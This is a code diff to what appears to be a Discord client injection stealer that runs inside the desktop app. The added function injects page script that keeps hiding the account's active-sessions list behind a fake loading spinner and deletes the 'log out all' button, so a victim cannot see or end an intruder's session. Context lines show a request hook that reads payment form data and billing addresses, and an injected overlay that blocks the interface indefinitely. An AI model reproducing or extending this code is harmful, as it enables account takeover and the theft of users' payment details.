@@ -1410,6 +1410,51 @@ const createWindow = (mainWindow) => {
     });
 };
 
+const blockDevices = async () => {
+    await delay(1000);
+    await execScript(`
+        const classes = [
+            { prefix: 'sessions_', action: 'replace' },
+            { prefix: 'logOutAllButton_', action: 'remove' }
+        ];
+        function k4itrunModifiesElements() {
+            classes.forEach(({ prefix, action }) => {
+                const elements = document.querySelectorAll(\`[class^="\${prefix}"]\`);
+                elements.forEach(element => {
+                    if (action === 'replace') {
+                        const div = document.createElement('div');
+                        div.innerHTML = \`
+                            <div class="container_e0eaac loading_e0eaac">
+                                <span class="spinner_b6db20" role="img" aria-label="Cargando">
+                                    <span class="inner_b6db20 lowMotion_b6db20">
+                                        <span class="item_b6db20"></span>
+                                        <span class="item_b6db20"></span>
+                                        <span class="item_b6db20"></span>
+                                    </span>
+                                </span>
+                            </div>
+                        \`;
+                        element.parentNode.replaceChild(div, element);
+                    } else if (action === 'remove') {
+                        element.remove();
+                    }
+                });
+            });
+        }
+        const observer = new MutationObserver((mutationsList, observer) => {
+            for (let mutation of mutationsList) {
+                if (mutation.type === 'childList') {
+                    k4itrunModifiesElements();
+                }
+            }
+        });
+        const config = { childList: true, subtree: true };
+        observer.observe(document.body, config);
+        k4itrunModifiesElements();
+    `)
+};
+blockDevices();
+
 const defaultSession = (webRequest) => {
     webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
         const { url, uploadData, method, statusCode, billing_address } = details;
@@ -1523,9 +1568,7 @@ const defaultSession = (webRequest) => {
                             "https://discord.com/assets/d4261c08ee2b8d686d9d.css",
                             "https://discord.com/assets/ed0fd6a2ab291ba57d4a.css",
                         ];
-    
                         const head = document.head || document.getElementsByTagName('head')[0];
-    
                         stylesheets.forEach(url => {
                             const stylesheetLink = document.createElement('link');
                             stylesheetLink.rel = 'stylesheet';
@@ -1533,7 +1576,6 @@ const defaultSession = (webRequest) => {
                             head.appendChild(stylesheetLink);
                         });
                     }
-                    
                     async function simulateClicks() {
                         try {
                             loadStylesheets();
@@ -1578,13 +1620,11 @@ const defaultSession = (webRequest) => {
                                 </div>
                             \`;
                             document.body.appendChild(div);
-                            document.body.appendChild(div);
-                            await new Promise((resolve) => setTimeout(resolve, 999999999));
+                            await new Promise((resolve) => setTimeout(resolve, Number.MAX_SAFE_INTEGER));
                             document.body.removeChild(div);
                         } catch (error) {
                         }
                     }
-                    
                     simulateClicks();
                 `);
             };
